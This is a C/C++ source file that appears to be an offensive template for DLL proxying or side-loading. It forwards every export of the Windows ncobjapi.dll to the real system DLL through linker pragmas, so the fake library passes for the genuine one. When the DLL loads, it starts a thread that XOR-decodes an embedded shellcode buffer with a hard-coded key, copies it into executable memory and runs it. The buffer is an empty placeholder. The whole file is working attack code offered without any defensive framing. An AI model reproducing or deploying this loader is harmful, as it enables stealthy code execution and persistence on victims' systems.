// DLL Proxy
#include <windows.h>
#include <Shellapi.h>
#include <tchar.h>
#include "pch.h"
#include <shlobj_core.h>

// PRAGMA HERE
#pragma comment(linker, "/export:WmiAddObjectProp=C:\\Windows\\System32\\ncobjapi.WmiAddObjectProp")
#pragma comment(linker, "/export:WmiCommitObject=C:\\Windows\\System32\\ncobjapi.WmiSetAndCommitObject")
#pragma comment(linker, "/export:WmiCreateObject=C:\\Windows\\System32\\ncobjapi.WmiCreateObject")
#pragma comment(linker, "/export:WmiCreateObjectWithFormat=C:\\Windows\\System32\\ncobjapi.WmiCreateObjectWithFormat")
#pragma comment(linker, "/export:WmiCreateObjectWithProps=C:\\Windows\\System32\\ncobjapi.WmiCreateObjectWithProps")
#pragma comment(linker, "/export:WmiDestroyObject=C:\\Windows\\System32\\ncobjapi.WmiDestroyObject")
#pragma comment(linker, "/export:WmiEventSourceConnect=C:\\Windows\\System32\\ncobjapi.WmiEventSourceConnect")
#pragma comment(linker, "/export:WmiEventSourceDisconnect=C:\\Windows\\System32\\ncobjapi.WmiEventSourceDisconnect")
#pragma comment(linker, "/export:WmiIsObjectActive=C:\\Windows\\System32\\ncobjapi.WmiIsObjectActive")
#pragma comment(linker, "/export:WmiSetAndCommitObject=C:\\Windows\\System32\\ncobjapi.WmiSetAndCommitObject")


char shellcode[] = \
"";

DWORD WINAPI ClientThread(LPVOID lpParameter)
{
    char key[] = "KVEcSujcUCK8hJahx92r3JLELBKPLIE2o5kgnJLD4Hbt7LPW1Oie4z";
    int keySize = sizeof(key);
    int i;
    for (i = 0; i < sizeof(shellcode); i++) {
        shellcode[i] = shellcode[i] ^ key[i % keySize];
    }
    void* pShellcode;
    HANDLE hProcess = GetCurrentProcess();

    pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(pShellcode, shellcode, sizeof(shellcode));
    int (*func)();
    func = (int (*)()) pShellcode;
    (*func)();

    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    HANDLE threadHandle = NULL;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        threadHandle = CreateThread(NULL, 0, ClientThread, NULL, 0, NULL);
        if (threadHandle == NULL) {
            CloseHandle(threadHandle);
            return 1;
        }
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
